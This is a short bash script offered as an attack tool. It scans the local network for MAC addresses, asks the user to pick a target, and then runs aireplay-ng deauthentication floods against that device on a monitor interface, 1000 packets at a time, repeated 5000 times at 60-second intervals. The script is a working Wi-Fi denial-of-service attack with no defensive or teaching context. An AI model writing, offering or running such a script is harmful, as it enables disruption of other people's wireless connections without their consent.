#!/bin/bash
function get_target_mac() {

    echo "Searching for nearby MAC addresses..."

    local macs=($(arp-scan --localnet | grep -Eo "([a-f0-9]{2}:){5}[a-f0-9]{2}"))

    local count=1

    for mac in "${macs[@]}"; do

        echo "$count) $mac"

        count=$((count + 1))

    done

    echo "Please select a target MAC address:"

    read target_mac_index

    target_mac=${macs[$((target_mac_index - 1))]}

    echo "Selected MAC address: $target_mac"

}



get_target_mac



for i in {1..5000}

do

    aireplay-ng -deauth 1000 -a $target_mac mon1

    sleep 60s

done
